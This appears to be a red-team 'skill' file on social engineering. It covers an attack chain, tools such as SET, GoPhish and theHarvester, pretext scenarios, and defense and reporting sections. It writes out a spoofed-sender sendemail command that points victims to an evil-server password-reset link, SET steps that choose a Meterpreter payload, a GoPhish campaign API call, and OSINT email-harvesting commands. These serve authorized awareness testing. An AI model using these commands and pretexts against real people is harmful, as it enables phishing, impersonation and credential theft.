# Skill: Social Engineering

> **Supplementary Files**:
> - `payloads.md` — SE attack payloads organized by category: phishing, email spoofing, credential harvesting, smishing, vishing, USB baiting, OSINT profiling, physical social engineering
> - `test-cases.md` — Structured test cases with severity levels covering phishing campaigns, email security, credential harvesting, physical/voice social engineering, and defense testing

## Description

Social engineering is the art of exploiting human psychological weaknesses rather than technical vulnerabilities to execute attacks. Attack vectors encompass Phishing, Pretexting, Baiting, Tailgating, Vishing, and other techniques. Technical defenses can be patched, but human trust, curiosity, and instinct to obey authority represent a permanent attack surface — **Human is the weakest link**.

This skill covers the complete social engineering attack chain from target profiling, pretext development, attack vector selection, to credential/action harvesting, combined with OSINT tools for precise, customized attacks. Mastered tools include SET (Social-Engineer Toolkit), GoPhish, King-Phisher, Maltego, theHarvester, and recon-ng.

---

## Use Cases

1. **Enterprise Security Awareness Assessment** - Test employee security awareness through authorized phishing exercises, generating quantified reports
2. **Red Team Social Engineering Simulation** - Simulate real APT attacker social engineering techniques to assess organizational defense capabilities
3. **Credential Harvesting Testing** - Build simulated login pages to test whether users will submit real credentials
4. **Physical Security Testing** - Assess physical access control effectiveness through Tailgating and Pretexting
5. **OSINT Target Profiling** - Collect target personnel social media, email, and organizational structure information to support precise social engineering

---

## Core Tools

| Tool | Purpose | Command/Usage Example |
|------|---------|----------------------|
| **SET (setoolkit)** | Integrated social engineering attack framework, phishing/website cloning/payloads | `sudo setoolkit` -> select attack vector |
| **GoPhish** | Web-managed phishing campaign platform | Dashboard to create Campaign + Landing Page |
| **King-Phisher** | Phishing campaign management and awareness training | `king-phisher` GUI + server-side deployment |
| **Maltego** | Visual OSINT correlation analysis and target profiling | Domain -> Email -> Social Profile transformation chains |
| **theHarvester** | Automated email/subdomain/hostname collection | `theHarvester -d target.com -b all` |
| **recon-ng** | Modular web reconnaissance framework, automated OSINT | `recon-ng` -> `use recon/domains-contacts/` |

---

## Methodology

### Attack Chain

```
Target              Pretext             Attack Vector       Delivery            Harvest &
Reconnaissance  ->  Development     ->  Selection       ->  Execution       ->  Analysis
(OSINT Profiling)   (Pretext Dev)       (Vector Select)     (Delivery)          (Harvest)
    |                   |                  |                  |                   |
    v                   v                  v                  v                   v
theHarvester       Scenario           Phishing           Email/SMS/         Credential
Maltego            construction       Baiting            USB/file delivery  collection
recon-ng           Identity           Vishing            Phone/in-person    Behavior
LinkedIn/          impersonation      Tailgating         Physical approach  analysis
social media       Script design                                             Report
mining             Timing selection                                          generation &
                                                                             iteration
```

**Phase Details**:

1. **Target Reconnaissance** - Collect target personnel information through OSINT: email addresses, job roles, social media activity, organizational structure, and technology stack preferences. The more precise the information, the higher the social engineering credibility.
2. **Pretext Development** - Build convincing attack scenarios based on reconnaissance results: IT department password reset notifications, HR benefits surveys, package delivery notices, executive urgent directives. Pretexts must align with the target's daily work scenarios.
3. **Attack Vector Selection** - Choose the optimal attack method based on target characteristics: email phishing for technical users, voice social engineering for non-technical users, tailgating or USB baiting for physical scenarios.
4. **Payload Delivery** - Execute the attack: send phishing emails, make phone calls, deploy USB devices, make in-person contact. Control the pace to avoid triggering alerts from simultaneous mass engagement.
5. **Credential & Action Harvest** - Collect credentials submitted on phishing pages, record target click behaviors, analyze interaction timelines and response patterns.

### Defense Perspective

| Defense Measure | Description | Attack Type Countered |
|-----------------|-------------|----------------------|
| **Security Awareness Training** | Regular security awareness training and phishing exercises | Phishing / Spear Phishing |
| **Email Filtering (SPF/DKIM/DMARC)** | Email authentication and content filtering | Email spoofing / phishing delivery |
| **MFA (Multi-Factor Auth)** | Add a second authentication factor beyond passwords | Post-credential-theft abuse |
| **Verification Procedures** | Secondary confirmation and callback verification for sensitive operations | Pretexting / Vishing |
| **Physical Access Control** | Access cards + biometric authentication + visitor registration | Tailgating / physical intrusion |
| **USB Port Policy** | Disable or restrict unauthorized USB devices | Baiting / malicious USB delivery |

---

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### 1. SET Phishing Campaign

```bash
# Launch SET (requires root privileges)
sudo setoolkit

# Select Social-Engineering Attacks (1)
# -> Spear-Phishing Attack Vectors (1)
# -> Perform a Mass Email Attack (1)

# Select Payload (e.g., Arduino / Meterpreter)
# Select email template or customize
# Configure target email list and SMTP server
```

### 2. Email Spoofing Techniques

```bash
# Use sendemail to send phishing emails with spoofed sender
sendemail -f "IT-Support@target-company.com" \
  -t victim@target-company.com \
  -u "Urgent: Password Expiration Notice" \
  -m "Your email password will expire in 24 hours. Please update immediately: http://evil-server/reset" \
  -s smtp.evil-server.com:587 \
  -xu username -xp password \
  -o tls=yes

# SPF/DKIM/DMARC detection (pre-attack reconnaissance)
dig txt target-company.com | grep -i spf
dig txt _dmarc.target-company.com
```

### 3. GoPhish Credential Harvesting Page

```
# GoPhish standard workflow:
# 1. Landing Pages - Clone target login page, add credential capture
# 2. Email Templates - Design phishing email template
# 3. Sending Profiles - Configure SMTP sending channel
# 4. Users & Groups - Import target email list
# 5. Campaigns - Launch campaign and monitor in real-time

# RESTful API automation example:
curl -X POST https://gophish-server/api/campaigns/ \
  -H "Authorization: {api_key}" \
  -d '{"name":"Q2-Phishing-Test","template":1,"page":1,"smtp":1,"groups":[1]}'
```

### 4. Pretexting Scenario Design

```
Common high-success-rate pretext scenarios:
- IT Help Desk password reset (impersonate IT support, claim abnormal login detected)
- HR benefits survey (impersonate HR sending survey link that actually collects credentials)
- Executive urgent directive (impersonate C-Level requiring finance/assistant to execute urgent operations)
- Package/delivery notification (forge package pickup link to induce clicks)
- Tech support callback (Vishing: impersonate Microsoft/Google support requesting remote access)
```

### 5. OSINT Target Profiling Workflow

```bash
# Step 1: Domain -> Email collection
theHarvester -d target-company.com -b all -l 500

# Step 2: Social media cross-validation
# LinkedIn: job title, department, tech stack, hire date
# Twitter/X: technical interests, recent activities, tools used
# GitHub: open-source projects, technical preferences, information leaked in code

# Step 3: Maltego visual correlation
# Domain -> DNS Names -> IP Address -> AS Number
# Domain -> Email -> Person -> Social Profile -> Phone Number

# Step 4: recon-ng automated aggregation
recon-ng
> marketplace install all
> modules load recon/domains-contacts/email-harvester
> options set source target-company.com
> run
```

## Detection Methods

Detecting social engineering threats requires monitoring multiple communication channels simultaneously. Email header analysis (SPF, DKIM, DMARC pass/fail) identifies spoofed senders before users interact with malicious content. URL inspection tools reveal lookalike domains and credential harvesting pages. On the human side, tracking unusual request patterns — such as employees suddenly requesting sensitive data access or password resets outside normal procedures — helps identify active pretexting campaigns targeting the organization.

## Reporting

Social engineering assessment reports must quantify organizational risk with measurable metrics. Key metrics include click-through rate (percentage of targets who clicked phishing links), credential submission rate (percentage who entered credentials on harvesting pages), and time-to-report (how quickly targets reported the suspicious communication to security teams). Each finding should include the pretext scenario, delivery method, target demographics, and specific behavioral observations that inform training recommendations.

## Common Pitfalls

A frequent mistake in social engineering assessments is using generic, low-effort phishing templates that test spam filter effectiveness rather than employee awareness. Effective assessments use realistic, context-specific pretexts that mirror actual threats targeting the organization's industry. Another pitfall is neglecting the post-compromise phase — after credentials are harvested, the assessment should demonstrate the actual business impact (access to sensitive systems, data exfiltration potential) to justify remediation investment.

---

## Hacker Laws

1. **The Weakest Link Is Human** - Firewalls can be perfectly configured, VPNs can encrypt all traffic, but a well-crafted phishing email can bypass all technical defenses. The essence of social engineering is shifting the attack surface from technical systems to people — and people can never be patched.

2. **Trust but Verify** - Pretexting succeeds because targets blindly trust authority. The defender's countermeasure: any request involving credentials, money, or sensitive data must be verified through an independent channel. The attacker's insight: anticipate and neutralize verification behaviors within the pretext.

3. **First Principles Thinking** - Don't mechanically copy social engineering templates. Understand the psychological mechanisms of trust-building (authority, urgency, social proof, reciprocity), and design attack schemes from first principles for specific targets. Generic phishing emails are noise; customized Spear Phishing is the weapon.

---

## Learning Resources

  **This skill's supplementary files**: payloads.md, test-cases.md

  **Related skills**: skills/recon-osint/SKILL.md, skills/social-intelligence/SKILL.md, skills/deep-research/SKILL.md, skills/web-xss/SKILL.md

  **External resources**:
  - **SET Official Repository**: [github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit)
  - **GoPhish Official Documentation**: [getgophish.com/documentation](https://getgophish.com/documentation/)
  - **Social-Engineer.org**: [social-engineer.org](https://www.social-engineer.org/) - Social engineering framework and attack vector encyclopedia
  - **Kevin Mitnick - The Art of Deception**: Classic social engineering book for understanding the psychological foundations of trust exploitation
  - **HackTricks - Phishing**: [book.hacktricks.xyz/generic-methodologies-and-resources/phishing](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing)
  - **King-Phisher**: [github.com/securestate/king-phisher](https://github.com/securestate/king-phisher)
